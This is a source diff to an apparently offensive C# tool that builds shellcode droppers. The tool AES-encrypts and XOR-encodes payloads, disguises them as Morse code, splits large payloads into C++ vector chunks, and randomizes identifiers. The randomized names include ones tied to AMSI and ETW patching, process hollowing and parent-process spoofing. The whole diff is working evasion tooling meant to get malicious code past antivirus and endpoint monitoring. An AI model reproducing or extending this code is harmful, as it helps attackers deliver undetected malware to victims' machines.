@@ -759,6 +759,7 @@ Sharperner.exe /convert:file.exe
                             {
                                 Console.WriteLine("[+] Raw payload detected.");
                                 rawSh3lLc0d3 = File.ReadAllBytes(filePath);
+                                Console.WriteLine(rawSh3lLc0d3.Length);
                                 aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
                             }
                             else if (IsBase64String(File.ReadAllText(filePath)))
@@ -778,14 +779,22 @@ Sharperner.exe /convert:file.exe
                             Console.WriteLine($"[+] XOR encode shellcode with key: {xorKey}");
 
                             // XOR
-                            byte[] xorAesEncByte = xorEncDec(aesEncByte, xorKey);
+                            byte[] xorAesEncByte = new byte[] { };
+                            if (rawSh3lLc0d3.Length > 1000 && dropperFormat == "cpp")
+                            {
+                                xorAesEncByte = xorEncDec(rawSh3lLc0d3, xorKey);
+                            }
+                            else
+                            {
+                                xorAesEncByte = xorEncDec(aesEncByte, xorKey);
+                            }
 
                             // back in the history
                             MorseForFun.InitializeDictionary();
 
                             //changes on the quotation
                             rawB64Output = Convert.ToBase64String(xorAesEncByte);
-                            xorAesEncStringB64 = $"\"{MorseForFun.Send(rawB64Output)}\"";
+                            xorAesEncStringB64 = MorseForFun.Send(rawB64Output);
                             morsed_aeskey = $"\"{MorseForFun.Send(aes_key)}\"";
                             morsed_aesiv = $"\"{MorseForFun.Send(aes_iv)}\"";
                             xorKey = $"\"{MorseForFun.Send(xorKey)}\"";
@@ -939,7 +948,7 @@ Sharperner.exe /convert:file.exe
                                 
 
                                 // replace in template file
-                                templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);
+                                templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);
 
                             }
                             catch (Exception err)
@@ -1076,17 +1085,62 @@ Sharperner.exe /convert:file.exe
                         // replace required values
                         try
                         {
+                            if (xorAesEncStringB64.Length > 16384) //16384
+                            {
+                                //var snippets = Regex.Split(xorAesEncStringB64, @"(.{1,16380})(?:\s|$)")
+                                //              .Where(x => x.Length > 0)
+                                //              .ToList();
+                                //var snippets = xorAesEncStringB64.Split(' ');
+                                var hugeCode = "std::vector<string> morsedv;\n";
+                                /*
+                                for (int k = 0; k < snippets.Length; k+=1000)
+                                {
+                                    hugeCode += $"morsedv.push_back(R\"({string.Join(" ", snippets.Skip(k).Take(1000))})\");\n";
+                                }
+                                */
+                                string[] z = xorAesEncStringB64.Split(' ');
+
+                                for (int i = 0; i < z.Length; i += 1000)
+                                {
+                                    hugeCode += "morsedv.push_back(R\"(";
+                                    hugeCode += string.Join(" ", z.Skip(i).Take(1000));
+                                    hugeCode += " )\");\n";
+                                }
+                                hugeCode += "morsed = std::accumulate(morsedv.begin(), morsedv.end(), std::string{});";
+                                //hugeCode += "for (const auto& piece : morsedv) morsed += piece;";
+                                /*
+                                for(int j=0; j < i; j++)
+                                {
+                                    hugeCode += $" morsed{j}";
+                                    if (j.Equals(i-1))
+                                    {
+                                        hugeCode += ";";
+                                    }
+                                    else
+                                    {
+                                        hugeCode += "+";
+                                    }
+                                }
+                                */
+                                //Console.WriteLine(hugeCode);
+                                //Environment.Exit(0);
+
+                                templateFileContent = templateFileContent.Replace("morsed = \"REPLACE SHELLCODE HERE\";", hugeCode).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv).Replace("REPLACEBOOLVALUE","1");
+                            }
+                            else
+                            {
+                                templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv).Replace("REPLACEBOOLVALUE", "0"); ;
+                            }
+
                             //randomize variable names
                             string[] variableNames = { "morsed", "sh3llc0de", "decoded", "b64a3skey", "b64a3siv", "morsedb64a3skey", "morsedb64a3siv", "morsedxorKey", "xorKey",
                                                 "x0rek3y", "ciphertext", "recovered", "policy", "explorer_handle", "hollow_bin", "pid", "bytesWritten", "p_size", "overwrite",
-                                                "translated", "lines", "delim", "ascii_to_morse", "tokenize", "translate_morse", "get_PPID", "howlow_sc", "patchETW", "patchAMSI", "amsiPatch", "amsiAddr", "amsiAddr_bk", "etwAddr", "etwPatch"};
+                                                "translated", "lines", "delim", "ascii_to_morse", "tokenize", "translate_morse", "get_PPID", "howlow_sc", "patchETW", "patchAMSI", "amsiPatch", "amsiAddr", "amsiAddr_bk", "etwAddr", "etwPatch", "patchAMSIOpenSession"};
 
                             foreach (string variableName in variableNames)
                             {
                                 templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
                             }
-
-                            templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);
 
                         }
                         catch
@@ -1285,7 +1339,7 @@ Sharperner.exe /convert:file.exe
                                 templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
                             }
 
-                            templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);
+                            templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);
                         }
                         catch
                         {
